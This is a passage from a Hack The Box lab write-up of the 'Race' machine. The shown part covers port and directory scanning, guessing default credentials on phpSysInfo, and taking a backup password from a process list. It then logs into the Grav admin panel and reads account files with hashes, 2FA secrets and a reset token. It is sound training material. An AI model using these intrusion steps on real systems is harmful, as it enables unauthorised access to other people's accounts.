@@ -1,0 +1,894 @@
+<article class="post h-entry" itemscope="" itemtype="http://schema.org/BlogPosting">
+<header class="post-header">
+<h1 class="post-title p-name" itemprop="name headline">HTB: Race</h1>
+<p class="post-meta">
+<span class="tag-list"><a class="post-tag" href="/tags#ctf">ctf</a> <a class="post-tag" href="/tags#hackthebox">hackthebox</a> <a class="post-tag" href="/tags#htb-race">htb-race</a> <a class="post-tag" href="/tags#vulnlab">vulnlab</a> <a class="post-tag" href="/tags#nmap">nmap</a> <a class="post-tag" href="/tags#grav-cms">grav-cms</a> <a class="post-tag" href="/tags#feroxbuster">feroxbuster</a> <a class="post-tag" href="/tags#phpsysinfo">phpsysinfo</a> <a class="post-tag" href="/tags#password-reset">password-reset</a> <a class="post-tag" href="/tags#cve-2024-28116">cve-2024-28116</a> <a class="post-tag" href="/tags#ssti">ssti</a> <a class="post-tag" href="/tags#twig-ssti">twig-ssti</a> <a class="post-tag" href="/tags#webshell">webshell</a> <a class="post-tag" href="/tags#proxy">proxy</a> <a class="post-tag" href="/tags#grav-malicious-theme">grav-malicious-theme</a> <a class="post-tag" href="/tags#toctou">toctou</a> <a class="post-tag" href="/tags#time-of-check-time-of-use">time-of-check-time-of-use</a> <a class="post-tag" href="/tags#named-pipe">named-pipe</a> </span><br/><br/>
+<time class="dt-published" datetime="2025-09-02T09:00:00+00:00" itemprop="datePublished">Sep 2, 2025
+      </time></p>
+</header>
+<div class="post-content e-content" itemprop="articleBody">
+<div class="row">
+<div class="col-sm-3">
+<div class="sticky-top">
+<p><a href="/2025/09/02/htb-race.html" style="color: #e6e6e6; text-decoration: none;">HTB: Race</a></p>
+<!--https://afeld.github.io/bootstrap-toc/-->
+<nav data-toggle="toc" id="toc"></nav>
+</div>
+</div>
+<div class="col-sm-9" id="postBody">
+<picture>
+<source srcset="/img/race-cover.webp" type="image/webp"/>
+<img alt="Race" class="include_image" loading="lazy" src="/img/race-cover.png" style="float: right; margin-right:50px; margin-left:50px; height:150px;">
+</img></picture>
+<p>Race starts with a website on Grav CMS, and a phpSysInfo page. I’ll find creds in the process list on phpSysInfo to get into the Grav admin panel as the limited backup user. I’ll create a backup, and use the results to reset the password of another admin. From this admin, I’ll show two ways to get execution, using CVE-2024-28116 and a malicious theme. From there I’ll pivot to the next user with a password from a shell script. For root, I’ll abuse a time-of-check / time-of-use vulnerability in a cron script, using named pipes to hang execution allowing me to switch files.</p>
+<h2 id="box-info">Box Info</h2>
+<!-- https://app.hackthebox.com/machines/715 -->
+<table>
+<thead>
+<tr>
+<th>Name</th>
+<th style="text-align: right"><a href="https://hackthebox.com/machines/race" style="font-size: xx-large; text-shadow: 0 0 5px #ffffff, 0 0 7px #ffffff; color: #1756a9" target="_blank">Race</a> <a href="https://hackthebox.com/machines/race" target="_blank"><picture style="float: right; padding-left: 20px;"><source srcset="/icons/box-race.webp" type="image/webp"/> <img alt="Race" class="img-av" src="/icons/box-race.png"/></picture></a><br/><a href="https://hackthebox.com/machines/race" style="font-size: small; color: white;" target="_blank">Play on HackTheBox</a></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Release Date</td>
+<td style="text-align: right"><a href="https://twitter.com/hackthebox_eu/status/1963603004482806048">02 Sep 2025</a></td>
+</tr>
+<tr>
+<td>Retire Date</td>
+<td style="text-align: right">02 Sep 2025</td>
+</tr>
+<tr>
+<td>OS</td>
+<td style="text-align: right">Linux <picture><source srcset="/icons/Linux.webp" type="image/webp"/><img alt="Linux" class="img-os" src="/icons/Linux.png"/></picture></td>
+</tr>
+<tr>
+<td>Base Points</td>
+<td style="text-align: right"><span class="diff-Hard">Hard [40]</span></td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-user.webp" type="image/webp"/><img alt="First Blood User" src="/icons/first-blood-user.png" style="display: unset"/></picture></td>
+<td style="text-align: right">N/A (non-competitive)</td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-root.webp" type="image/webp"/><img alt="First Blood Root" src="/icons/first-blood-root.png" style="display: unset"/></picture></td>
+<td style="text-align: right">N/A (non-competitive)</td>
+</tr>
+<tr>
+<td>Creator</td>
+<td style="text-align: right"><a href="https://app.hackthebox.com/users/77141" rel="noopener" target="_blank"><img alt="jkr" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/77141" style="display: unset"/><span class="user-text" style="display: none"> jkr</span></a><br/></td>
+</tr>
+</tbody>
+</table>
+<h2 id="recon">Recon</h2>
+<h3 id="initial-scanning">Initial Scanning</h3>
+<p><code class="language-plaintext highlighter-rouge">nmap</code> finds two open TCP ports, SSH (22) and HTTP (80):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>nmap <span class="nt">-p-</span> <span class="nt">-vvv</span> <span class="nt">--min-rate</span> 10000 10.129.234.211
+<span class="go">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-28 15:54 UTC
+...[snip]...
+Nmap scan report for 10.129.234.211
+Host is up, received echo-reply ttl 63 (0.095s latency).
+Scanned at 2025-08-28 15:54:26 UTC for 6s
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack ttl 63
+80/tcp open  http    syn-ack ttl 63
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 5.98 seconds
+           Raw packets sent: 66231 (2.914MB) | Rcvd: 65536 (2.621MB)
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span>nmap <span class="nt">-p</span> 22,80 <span class="nt">-sCV</span> 10.129.234.211
+<span class="go">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-28 15:54 UTC
+Nmap scan report for 10.129.234.211
+Host is up (0.094s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 62:b0:1e:c5:e8:81:5c:94:39:ed:37:7e:21:cf:b1:a8 (ECDSA)
+|_  256 37:a3:d3:cd:35:dc:cc:d8:db:3c:c3:4d:ad:22:29:a9 (ED25519)
+80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
+|_http-title: Site doesn't have a title (text/html).
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 10.13 seconds
+</span></code></pre></div></div>
+<p>Based on the <a href="/cheatsheets/os#ubuntu">OpenSSH and Apache</a> versions, the host is likely running Ubuntu 22.04 jammy (or maybe 22.10 kinetic).</p>
+<p>All of the ports show a TTL of 63, which matches the <a href="/cheatsheets/os#os-identification">expected TTL</a> for Linux one hop away.</p>
+<h3 id="website---tcp-80">Website - TCP 80</h3>
+<h4 id="site">Site</h4>
+<p>The site is for a racing technology company:</p>
+<div style="position: relative;">
+<picture>
+<source srcset="/img/image-20250828115833683.webp" type="image/webp"/>
+<img alt="image-20250828115833683" class="include_image" loading="lazy" src="/img/image-20250828115833683.png" style="max-height: 400px; object-fit: cover; object-position: top; width: -webkit-fill-available; mask-image: linear-gradient(rgb(0, 0, 0), rgb(0,0,0) calc(100% - 100px), rgba(0,0,0,0) calc(100% - 20px)); -webkit-mask-image: linear-gradient(rgb(0, 0, 0), rgb(0,0,0) calc(100% - 100px), rgba(0,0,0,0) calc(100% - 20px));"/>
+</picture>
+<a href="javascript:void(0)" onclick="click_expand_image(event)" style="position: absolute; bottom: 35px; right: 15px;" title="Click to expand for full content"><img alt="expand" class="expand-contract" src="/icons/expand.png"/></a>
+</div>
+<p>The page does have an email address, <code class="language-plaintext highlighter-rouge">fast@race.vl</code>.</p>
+<h4 id="tech-stack">Tech Stack</h4>
+<p>On visiting <code class="language-plaintext highlighter-rouge">/</code>, it returns a 200 page that just uses JavaScript to redirect to <code class="language-plaintext highlighter-rouge">/racers/</code>, which is the page above. That response sets a cookie:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
+<span class="na">Date</span><span class="p">:</span> <span class="s">Thu, 28 Aug 2025 16:08:40 GMT</span>
+<span class="na">Server</span><span class="p">:</span> <span class="s">Apache/2.4.52 (Ubuntu)</span>
+<span class="na">Set-Cookie</span><span class="p">:</span> <span class="s">grav-site-09f1269=ofdbsclh7rv88d5sj0n4o9ee08; expires=Thu, 28-Aug-2025 16:38:41 GMT; Max-Age=1800; path=/racers/; domain=10.129.234.211; HttpOnly; SameSite=Lax</span>
+<span class="na">Expires</span><span class="p">:</span> <span class="s">Thu, 04 Sep 2025 16:08:41 GMT</span>
+<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">max-age=604800</span>
+<span class="na">Pragma</span><span class="p">:</span> <span class="s">no-cache</span>
+<span class="na">ETag</span><span class="p">:</span> <span class="s">"210b4f8a077ef99d667a2eeb572812ca"</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">11411</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html;charset=UTF-8</span>
+</code></pre></div></div>
+<p>The server is running Apache, and the cookie suggests <a href="https://getgrav.org/">Grav</a>, an open-source PHP based CMS.</p>
+<p>The page footer also shows this:</p>
+<picture>
+<source srcset="/img/image-20250828120116362.webp" type="image/webp"/>
+<img alt="image-20250828120116362" class="include_image" loading="lazy" src="/img/image-20250828120116362.png"/>
+</picture>
+<p>The 404 page is the <a href="/cheatsheets/404#apache--httpd">default Apache 404</a>:</p>
+<picture>
+<source srcset="/img/image-20250828120137276.webp" type="image/webp"/>
+<img alt="image-20250828120137276" class="include_image" loading="lazy" src="/img/image-20250828120137276.png"/>
+</picture>
+<h4 id="directory-brute-force">Directory Brute Force</h4>
+<p>I can try <code class="language-plaintext highlighter-rouge">feroxbuster</code> with <code class="language-plaintext highlighter-rouge">-x php</code>, but it will find <code class="language-plaintext highlighter-rouge">/racers/</code> and then a <em>ton</em> of stuff in there, most of which I can find by looking at the Grav source.</p>
+<p>I am curious to know if there’s anything else in <code class="language-plaintext highlighter-rouge">/</code>, so I’ll run with <code class="language-plaintext highlighter-rouge">-n</code> to not recurse:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>feroxbuster <span class="nt">-u</span> http://10.129.234.211 <span class="nt">-x</span> php <span class="nt">-n</span>
+<span class="go">                                                                                                                      
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher 🤓                 ver: 2.11.0
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://10.129.234.211
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+ 👌  Status Codes          │ All Status Codes!
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.11.0
+ 🔎  Extract Links         │ true
+ 💲  Extensions            │ [php]
+ 🏁  HTTP methods          │ [GET]
+ 🚫  Do Not Recurse        │ true
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+</span><span class="feroxbuster-red">403</span><span class="go">      GET        9l       28w      279c </span><span class="feroxbuster-green">Auto-filtering </span><span class="go">found </span><span class="feroxbuster-red">404</span><span class="go">-like response and created new filter; toggle off with </span><span class="feroxbuster-yellow">--dont-filter</span><span class="go">
+</span><span class="feroxbuster-red">404</span><span class="go">      GET        9l       31w      276c </span><span class="feroxbuster-green">Auto-filtering </span><span class="go">found </span><span class="feroxbuster-red">404</span><span class="go">-like response and created new filter; toggle off with </span><span class="feroxbuster-yellow">--dont-filter</span><span class="go">
+</span><span class="feroxbuster-green">200</span><span class="go">      GET        8l       16w      163c http://10.129.234.211/
+</span><span class="feroxbuster-red">401</span><span class="go">      GET       14l       54w      461c http://10.129.234.211/phpsysinfo
+[</span><span class="feroxbuster-yellow">####################</span><span class="go">] - 2m     30001/30001   0s      </span><span class="feroxbuster-green">found</span><span class="go">:2       </span><span class="feroxbuster-red">errors</span><span class="go">:0
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 2m     30000/30000   254/s   http://10.129.234.211/  
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">/phpsysinfo</code> is return 401 because it requires HTTP basic auth.</p>
+<h2 id="shell-as-www-data">Shell as www-data</h2>
+<h3 id="phpsysinfo">phpSysInfo</h3>
+<p>I’ll guess admin / admin, and it works. There’s an instance of <a href="https://phpsysinfo.github.io/phpsysinfo/">phpSysInfo</a>:</p>
+<div style="position: relative;">
+<picture>
+<source srcset="/img/image-20250828122926726.webp" type="image/webp"/>
+<img alt="image-20250828122926726" class="include_image" loading="lazy" src="/img/image-20250828122926726.png" style="max-height: 400px; object-fit: cover; object-position: top; width: -webkit-fill-available; mask-image: linear-gradient(rgb(0, 0, 0), rgb(0,0,0) calc(100% - 100px), rgba(0,0,0,0) calc(100% - 20px)); -webkit-mask-image: linear-gradient(rgb(0, 0, 0), rgb(0,0,0) calc(100% - 100px), rgba(0,0,0,0) calc(100% - 20px));"/>
+</picture>
+<a href="javascript:void(0)" onclick="click_expand_image(event)" style="position: absolute; bottom: 35px; right: 15px;" title="Click to expand for full content"><img alt="expand" class="expand-contract" src="/icons/expand.png"/></a>
+</div>
+<p>This is a host system information display. It includes a process list,and looking at the tree under <code class="language-plaintext highlighter-rouge">cron</code>, there’s a backup job with a password:</p>
+<picture>
+<source srcset="/img/image-20250828123050750.webp" type="image/webp"/>
+<img alt="image-20250828123050750" class="include_image" loading="lazy" src="/img/image-20250828123050750.png"/>
+</picture>
+<p>The password does not work for SSH:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec ssh 10.129.234.211 <span class="nt">-u</span> backup <span class="nt">-p</span> Wedobackupswithsecur3password5.Noonecanhackus!
+<span class="netexec-protocol">SSH </span><span class="go">        10.129.234.211  22     10.129.234.211   </span><span class="netexec-logmessage">[*]</span><span class="go"> SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.13
+</span><span class="netexec-protocol">SSH </span><span class="go">        10.129.234.211  22     10.129.234.211   </span><span class="netexec-logfail">[-]</span><span class="go"> backup:Wedobackupswithsecur3password5.Noonecanhackus!
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec ssh 10.129.234.211 <span class="nt">-u</span> root <span class="nt">-p</span> Wedobackupswithsecur3password5.Noonecanhackus!
+<span class="netexec-protocol">SSH </span><span class="go">        10.129.234.211  22     10.129.234.211   </span><span class="netexec-logmessage">[*]</span><span class="go"> SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.13
+</span><span class="netexec-protocol">SSH </span><span class="go">        10.129.234.211  22     10.129.234.211   </span><span class="netexec-logfail">[-]</span><span class="go"> root:Wedobackupswithsecur3password5.Noonecanhackus!
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec ssh 10.129.234.211 <span class="nt">-u</span> admin <span class="nt">-p</span> Wedobackupswithsecur3password5.Noonecanhackus!
+<span class="netexec-protocol">SSH </span><span class="go">        10.129.234.211  22     10.129.234.211   </span><span class="netexec-logmessage">[*]</span><span class="go"> SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.13
+</span><span class="netexec-protocol">SSH </span><span class="go">        10.129.234.211  22     10.129.234.211   </span><span class="netexec-logfail">[-]</span><span class="go"> admin:Wedobackupswithsecur3password5.Noonecanhackus!
+</span></code></pre></div></div>
+<h3 id="admin-access-as-patrick">Admin Access as patrick</h3>
+<h4 id="grav-admin-as-backup">Grav Admin as backup</h4>
+<p>The Grav admin panel is at <code class="language-plaintext highlighter-rouge">/racers/admin</code>, which I can find in the <a href="https://learn.getgrav.org/17/admin-panel/introduction#usage">docs</a> or with bruteforce like <code class="language-plaintext highlighter-rouge">feroxbuster</code>. It presents a login form:</p>
+<picture>
+<source srcset="/img/image-20250828124423433.webp" type="image/webp"/>
+<img alt="image-20250828124423433" class="include_image" loading="lazy" src="/img/image-20250828124423433.png"/>
+</picture>
+<p>There’s a note about the length of the password having to be at least 32 characters, and it just so happens that the password from the cron is that long. It works with the backup user:</p>
+<picture>
+<source srcset="/img/image-20250828124557671.webp" type="image/webp"/>
+<img alt="image-20250828124557671" class="include_image" loading="lazy" src="/img/image-20250828124557671.png"/>
+</picture>
+<p>The backup user doesn’t have access to much. The Dashboard is empty. Tools presents a backup utility:</p>
+<picture>
+<source srcset="/img/image-20250828124821357.webp" type="image/webp"/>
+<img alt="image-20250828124821357" class="include_image" loading="lazy" src="/img/image-20250828124821357.png"/>
+</picture>
+<p>The banner says no backup has been generated. The configured profile will backup the entire site, minus some directories and files:</p>
+<picture>
+<source srcset="/img/image-20250828125513940.webp" type="image/webp"/>
+<img alt="image-20250828125513940" class="include_image" loading="lazy" src="/img/image-20250828125513940.png"/>
+</picture>
+<p>I’ll click “Backup Now” and it spins for a second before offering a download:</p>
+<picture>
+<source srcset="/img/image-20250828125533456.webp" type="image/webp"/>
+<img alt="image-20250828125533456" class="include_image" loading="lazy" src="/img/image-20250828125533456.png"/>
+</picture>
+<h4 id="backup">Backup</h4>
+<p>The unzipped backup file looks like the CMS file system:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">assets  cache               composer.json    images       logs       robots.txt   tmp     webserver-configs
+backup  CHANGELOG.md        composer.lock    index.php    now.json   SECURITY.md  user
+bin     CODE_OF_CONDUCT.md  CONTRIBUTING.md  LICENSE.txt  README.md  system       vendor
+</span></code></pre></div></div>
+<p>A lot of the files and folders match what is in the <a href="https://github.com/getgrav/grav">Grav Github</a>:</p>
+<picture>
+<source srcset="/img/image-20250829065722843.webp" type="image/webp"/>
+<img alt="image-20250829065722843" class="include_image" loading="lazy" src="/img/image-20250829065722843.png"/>
+</picture>
+<p>The Grav version is 1.7.43:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">cat </span>system/defines.php  | <span class="nb">grep </span>GRAV_VERSION
+<span class="go">define('GRAV_VERSION', '1.7.43');
+</span></code></pre></div></div>
+<p>Grav stores data in files. The user information is in <code class="language-plaintext highlighter-rouge">user/accounts</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">ls </span>user/accounts/
+<span class="go">admin.yaml  backup.yaml  patrick.yaml
+</span></code></pre></div></div>
+<p>Each user has configuration information and a hashed password:</p>
+<div class="language-yml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">state</span><span class="pi">:</span> <span class="s">enabled</span>
+<span class="na">email</span><span class="pi">:</span> <span class="s">admin@race.vl</span>
+<span class="na">fullname</span><span class="pi">:</span> <span class="s1">'</span><span class="s">Admin</span><span class="nv"> </span><span class="s">I.</span><span class="nv"> </span><span class="s">Strator'</span>
+<span class="na">title</span><span class="pi">:</span> <span class="s">Administrator</span>
+<span class="na">access</span><span class="pi">:</span>
+  <span class="na">admin</span><span class="pi">:</span>
+    <span class="na">login</span><span class="pi">:</span> <span class="kc">true</span>
+    <span class="na">super</span><span class="pi">:</span> <span class="kc">true</span>
+  <span class="na">site</span><span class="pi">:</span>
+    <span class="na">login</span><span class="pi">:</span> <span class="kc">true</span>
+<span class="na">hashed_password</span><span class="pi">:</span> <span class="s">$2y$10$/e6nnqGJ6un4X6wKPpyeNecHf8wyZ.G//0Q7XhLLuQ15v7sEzKVzS</span>
+</code></pre></div></div>
+<p>There’s not much sense in trying to crack the passwords as I’ve already seen the policy requires 32 characters. The backup account has the admin access set to <code class="language-plaintext highlighter-rouge">login</code> and <code class="language-plaintext highlighter-rouge">maintenance</code>, which is why it can do so few things:</p>
+<div class="language-yml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">state</span><span class="pi">:</span> <span class="s">enabled</span>
+<span class="na">email</span><span class="pi">:</span> <span class="s">backup@race.vl</span>
+<span class="na">fullname</span><span class="pi">:</span> <span class="s1">'</span><span class="s">Ba</span><span class="nv"> </span><span class="s">C.</span><span class="nv"> </span><span class="s">Kup'</span>
+<span class="na">language</span><span class="pi">:</span> <span class="s">en</span>
+<span class="na">content_editor</span><span class="pi">:</span> <span class="s">default</span>
+<span class="na">twofa_enabled</span><span class="pi">:</span> <span class="kc">false</span>
+<span class="na">twofa_secret</span><span class="pi">:</span> <span class="s">SMIJEB7XFJ7AEO6RPCKDWXUZ2MW4MOY4</span>
+<span class="na">avatar</span><span class="pi">:</span> <span class="pi">{</span>  <span class="pi">}</span>
+<span class="na">hashed_password</span><span class="pi">:</span> <span class="s">$2y$10$drGaFWuga2r3uPcQXqSEueEEru4hlWvYu.BixWiisEHdgFNi.BwYK</span>
+<span class="na">access</span><span class="pi">:</span>
+  <span class="na">admin</span><span class="pi">:</span>
+    <span class="na">login</span><span class="pi">:</span> <span class="kc">true</span>
+    <span class="na">maintenance</span><span class="pi">:</span> <span class="kc">true</span>
+</code></pre></div></div>
+<p>patrick has more access than backup, but less than admin:</p>
+<div class="language-yml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">state</span><span class="pi">:</span> <span class="s">enabled</span>
+<span class="na">email</span><span class="pi">:</span> <span class="s">patrick@race.vl</span>
+<span class="na">fullname</span><span class="pi">:</span> <span class="s1">'</span><span class="s">Patrick</span><span class="nv"> </span><span class="s">P.</span><span class="nv"> </span><span class="s">Rick'</span>
+<span class="na">language</span><span class="pi">:</span> <span class="s">en</span>
+<span class="na">content_editor</span><span class="pi">:</span> <span class="s">default</span>
+<span class="na">twofa_enabled</span><span class="pi">:</span> <span class="kc">false</span>
+<span class="na">twofa_secret</span><span class="pi">:</span> <span class="s">LW35AG7V4U4NLOBVU5P6NG35GP5YWJKT</span>
+<span class="na">avatar</span><span class="pi">:</span> <span class="pi">{</span>  <span class="pi">}</span>
+<span class="na">hashed_password</span><span class="pi">:</span> <span class="s">$2y$10$TWyPZQDqMZJJ/0pLdWUbY.TxVKVMHP3LzfUTo3BYWFRID7uXaoXcC</span>
+<span class="na">reset</span><span class="pi">:</span> <span class="s1">'</span><span class="s">553e7719d2674ae2bfb29eb0aaa806d0::1701718773'</span>
+<span class="na">access</span><span class="pi">:</span>
+  <span class="na">site</span><span class="pi">:</span>
+    <span class="na">login</span><span class="pi">:</span> <span class="kc">true</span>
+  <span class="na">admin</span><span class="pi">:</span>
+    <span class="na">login</span><span class="pi">:</span> <span class="kc">true</span>
+    <span class="na">super</span><span class="pi">:</span> <span class="kc">false</span>
+    <span class="na">cache</span><span class="pi">:</span> <span class="kc">false</span>
+    <span class="na">configuration</span><span class="pi">:</span>
+      <span class="na">system</span><span class="pi">:</span> <span class="kc">true</span>
+      <span class="na">site</span><span class="pi">:</span> <span class="kc">true</span>
+      <span class="na">media</span><span class="pi">:</span> <span class="kc">false</span>
+      <span class="na">security</span><span class="pi">:</span> <span class="kc">false</span>
+      <span class="na">info</span><span class="pi">:</span> <span class="kc">false</span>
+      <span class="na">pages</span><span class="pi">:</span> <span class="kc">false</span>
+      <span class="na">users</span><span class="pi">:</span> <span class="kc">false</span>
+    <span class="na">pages</span><span class="pi">:</span> <span class="kc">true</span>
+    <span class="na">maintenance</span><span class="pi">:</span> <span class="kc">true</span>
+    <span class="na">themes</span><span class="pi">:</span> <span class="kc">true</span>
+</code></pre></div></div>
+<p>There’s also a <code class="language-plaintext highlighter-rouge">reset</code> value.</p>
+<h4 id="password-reset-flow">Password Reset Flow</h4>
+<p>When I click the “forgot” button on the login page it leads to <code class="language-plaintext highlighter-rouge">/racers/admin/forgot</code>. Searching for that in the code shows a few places:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">grep</span> <span class="nt">-r</span> <span class="s1">'/forgot'</span>
+<span class="go">user/plugins/admin/classes/plugin/Controllers/Login/LoginController.php:            return $this-&gt;createRedirectResponse('/forgot');
+user/plugins/admin/classes/plugin/Controllers/Login/LoginController.php:                    return $this-&gt;createRedirectResponse('/forgot');
+user/plugins/admin/classes/plugin/Controllers/Login/LoginController.php:        return $this-&gt;createRedirectResponse('/forgot');
+user/plugins/admin/classes/plugin/Controllers/Login/LoginController.php:            return $this-&gt;createRedirectResponse('/forgot');
+user/plugins/admin/themes/grav/templates/partials/login-form.html.twig:        &lt;a class="button secondary" href="{{ admin_route('/forgot') }}"&gt;&lt;i class="fa fa-exclamation-circle"&gt;&lt;/i&gt; {{ 'PLUGIN_ADMIN.LOGIN_BTN_FORGOT'|t }}&lt;/a&gt;
+user/plugins/login/README.md:route_forgot: '/forgot_password'            # Route for the forgot password process
+user/plugins/login/blueprints.yaml:              placeholder: "/forgot_password"
+user/plugins/login/templates/forgot.html.twig:    {% include 'partials/forgot-form.html.twig' %}
+user/plugins/login/login.yaml:route_forgot: '/forgot_password'            # Route for the forgot password process
+user/plugins/login/login.php:            $this-&gt;login-&gt;getRoute('forgot') ?: '/forgot_password',
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">LoginController.php</code> is most interesting. I’ll check out the functions:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">grep</span> <span class="s1">'function'</span> user/plugins/admin/classes/plugin/Controllers/Login/LoginController.php
+<span class="go">    public function displayLogin(): ResponseInterface
+    public function displayForgot(): ResponseInterface
+    public function displayReset(string $username = null, string $token = null): ResponseInterface
+    public function displayRegister(): ResponseInterface
+    public function displayUnauthorized(): ResponseInterface
+    public function taskLogin(): ResponseInterface
+    public function taskLogout(): ResponseInterface
+    public function taskTwofa(): ResponseInterface
+    public function taskReset(string $username = null, string $token = null): ResponseInterface
+    public function taskForgot(): ResponseInterface
+    public function taskRegister(): ResponseInterface
+    protected function is2FA(UserInterface $user): bool
+    protected function getFormSubmitMethod(string $name): callable
+                return static function(array $data, array $files) {};
+                return function(array $data, array $files) {
+    private function doRegistration(array $data, array $files): void
+    private function getLogin(): Login
+    private function getEmail(): Email
+    private function getAccounts(): UserCollectionInterface
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">taskReset</code> seems like it might be what takes the reset string and compares it to what’s in the YAML file. It does some initialization, and then checks if the user passed into it exists, and if that user’s <code class="language-plaintext highlighter-rouge">reset</code> value is not null:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="cd">/**
+     * Handle the reset password action.
+     *
+     * @param string|null $username
+     * @param string|null $token
+     * @return ResponseInterface
+     */</span>
+    <span class="k">public</span> <span class="k">function</span> <span class="n">taskReset</span><span class="p">(</span><span class="kt">string</span> <span class="nv">$username</span> <span class="o">=</span> <span class="kc">null</span><span class="p">,</span> <span class="kt">string</span> <span class="nv">$token</span> <span class="o">=</span> <span class="kc">null</span><span class="p">):</span> <span class="kt">ResponseInterface</span>
+    <span class="p">{</span>
+<span class="mf">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="mf">...</span>
+        <span class="nv">$users</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">getAccounts</span><span class="p">();</span>
+
+        <span class="nv">$username</span> <span class="o">=</span> <span class="nv">$username</span> <span class="o">??</span> <span class="nv">$data</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]</span> <span class="o">??</span> <span class="kc">null</span><span class="p">;</span>
+        <span class="nv">$token</span> <span class="o">=</span> <span class="nv">$token</span> <span class="o">??</span> <span class="nv">$data</span><span class="p">[</span><span class="s1">'token'</span><span class="p">]</span> <span class="o">??</span> <span class="kc">null</span><span class="p">;</span>
+
+        <span class="nv">$user</span> <span class="o">=</span> <span class="nv">$username</span> <span class="o">?</span> <span class="nv">$users</span><span class="o">-&gt;</span><span class="nf">load</span><span class="p">(</span><span class="nv">$username</span><span class="p">)</span> <span class="o">:</span> <span class="kc">null</span><span class="p">;</span>
+        <span class="nv">$password</span> <span class="o">=</span> <span class="nv">$data</span><span class="p">[</span><span class="s1">'password'</span><span class="p">];</span>
+
+        <span class="k">if</span> <span class="p">(</span><span class="nv">$user</span> <span class="o">&amp;&amp;</span> <span class="nv">$user</span><span class="o">-&gt;</span><span class="nf">exists</span><span class="p">()</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$user</span><span class="o">-&gt;</span><span class="nf">get</span><span class="p">(</span><span class="s1">'reset'</span><span class="p">)))</span> <span class="p">{</span>
+<span class="mf">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="mf">...</span>
+</code></pre></div></div>
+<p>If there is a token, it breaks it on “::”, saving the first part as the token and the second as the expiration time. If the submitted token matches the loaded token and the expiration date isn’t past, then it resets the password:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mf">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="mf">...</span>
